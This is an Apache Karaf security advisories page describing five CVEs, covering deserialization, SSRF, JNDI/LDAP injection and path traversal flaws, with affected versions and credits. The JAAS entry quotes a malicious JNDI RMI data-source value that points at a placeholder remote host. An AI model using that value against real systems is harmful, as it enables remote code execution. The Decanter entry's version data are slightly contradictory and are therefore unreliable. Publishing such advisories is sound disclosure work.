---
title: Apache Karaf security advisories
description: Security information for Apache Karaf
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache Karaf? Send your report to the [Apache Security Team](mailto:security@apache.org).

# Advisories

This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)
{.bg-warning}

## Decanter log-socket collector has deserialization vulnerability ## { #CVE-2026-24656 }

CVE-2026-24656 [\[CVE json\]](./CVE-2026-24656.cve.json)

_Last updated: 2026-01-26T09:41:22.803Z_

### Affected

* Apache Karaf before 2.12.0
* Apache Karaf at 2.12.0


### Description

<p>Deserialization of Untrusted Data vulnerability in Apache Karaf Decanter.</p><br>The Decanter log socket collector exposes the port 4560, without authentication. If the collector exposes allowed classes property, this configuration can be bypassed.<br>It means that the log socket collector is vulnerable to deserialization of untrusted data, eventually causing DoS.<br><br><br>NB: Decanter log socket collector is not installed by default. Users who have not installed Decanter log socket are not impacted by this issue.<br><br><p>This issue affects Apache Karaf Decanter before 2.12.0.</p><p>Users are recommended to upgrade to version 2.12.0, which fixes the issue.</p>

### References
* https://lists.apache.org/thread/dc5wmdn6hyc992olntkl75kk04ndzx34


### Credits
* r00t4dm (finder)


## Cave SSRF and arbitrary file access ## { #CVE-2024-34365 }

CVE-2024-34365 [\[CVE json\]](./CVE-2024-34365.cve.json) [\[OSV json\]](./CVE-2024-34365.osv.json)



_Last updated: 2024-05-09T06:49:03.305Z_

### Affected

* Apache Karaf Cave through *


### Description

** UNSUPPORTED WHEN ASSIGNED ** Improper Input Validation vulnerability in Apache Karaf Cave.<p>This issue affects all versions of Apache Karaf Cave.</p>As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>

### References
* https://karaf.apache.org/security/cve-2024-34365.txt


### Credits
* cigar (finder)


## JDBC JAAS LDAP injection ## { #CVE-2022-40145 }

CVE-2022-40145 [\[CVE json\]](./CVE-2022-40145.cve.json) [\[OSV json\]](./CVE-2022-40145.osv.json)



_Last updated: 2022-12-21T15:53:26.357Z_

### Affected

* Apache Karaf from 4.4.0 before 4.4.2
* Apache Karaf before 4.3.8


### Description

<span style="background-color: rgb(255, 255, 255);">This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.<br><br>The function jaas.modules.src.main.java.por</span><span style="background-color: rgb(255, 255, 255);">g.apache.karaf.jass.modules.</span><span style="background-color: rgb(255, 255, 255);">jdbc.JDBCUtils#doCreateDatasou</span><span style="background-color: rgb(255, 255, 255);">rce</span><br><span style="background-color: rgb(255, 255, 255);">use InitialContext.lookup(jndiName</span><span style="background-color: rgb(255, 255, 255);">) without filtering.<br>An user can modify&nbsp;</span><span style="background-color: rgb(255, 255, 255);">`options.put(JDBCUtils.DATASOU</span><span style="background-color: rgb(255, 255, 255);">RCE, "osgi:" +&nbsp;</span><span style="background-color: rgb(255, 255, 255);">DataSource.class.getName());` to `options.put(JDBCUtils.DATASOU</span><span style="background-color: rgb(255, 255, 255);">RCE,</span><span style="background-color: rgb(255, 255, 255);">"jndi:rmi://x.x.x.x:xxxx/Comma</span><span style="background-color: rgb(255, 255, 255);">nd");` in JdbcLoginModuleTest#setup.</span><br><br><span style="background-color: rgb(255, 255, 255);">This is vulnerable to a remote code execution (RCE) attack when a</span><br><span style="background-color: rgb(255, 255, 255);">configuration uses a JNDI LDAP data source URI when an attacker has</span><br><span style="background-color: rgb(255, 255, 255);">control of the target LDAP server.</span><p>This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.</p>We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8

### References
* https://karaf.apache.org/security/cve-2022-40145.txt


### Credits
* Xun Bai <bbbbear68@gmail.com> (reporter)


## Path traversal flaws ## { #CVE-2022-22932 }

CVE-2022-22932 [\[CVE json\]](./CVE-2022-22932.cve.json) [\[OSV json\]](./CVE-2022-22932.osv.json)



_Last updated: 2022-01-25T14:53:17.546Z_

### Affected

* Apache Karaf from Apache Karaf before 4.2.15


### Description

Apache Karaf obr:* commands and run goal on the karaf-maven-plugin have partial
path traversal which allows to break out of expected folder.

The risk is low as obr:* commands are not very used and the entry is set by user.

This has been fixed in revision:

https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4
https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf

Mitigation: Apache Karaf users should upgrade to 4.2.15 or 4.3.6
or later as soon as possible, or use correct path.

JIRA Tickets: https://issues.apache.org/jira/browse/KARAF-7326

### References
* https://karaf.apache.org/security/cve-2022-22932.txt


### Credits
* This issue was discovered and reported by GHSL team member Jaroslav Lobacevski


## Insecure Java Deserialization in Apache Karaf ## { #CVE-2021-41766 }

CVE-2021-41766 [\[CVE json\]](./CVE-2021-41766.cve.json) [\[OSV json\]](./CVE-2021-41766.osv.json)



_Last updated: 2022-01-25T14:39:43.793Z_

### Affected

* Apache Karaf from Apache Karaf before 4.3.6


### Description

Apache Karaf allows monitoring of applications and the Java runtime by
using the Java Management Extensions (JMX).
JMX is a Java RMI based technology that relies on Java serialized
objects for client server communication.
Whereas the default JMX implementation is hardened against
unauthenticated deserialization attacks, the implementation
used by Apache Karaf is not protected against this kind of attack.

The impact of Java deserialization vulnerabilities strongly depends
on the classes that are available within the targets
class path. 
Generally speaking, deserialization of untrusted data does always 
represent a high security risk and should be prevented.

The risk is low as, by default, Karaf uses a limited set of classes in the JMX server class path.
It depends of system scoped classes (e.g. jar in the lib folder).

### References
* https://karaf.apache.org/security/cve-2021-41766.txt


### Credits
* This issue was reported by Daniel Heyne, Konstantin Samuel and Tobias Neitzel.
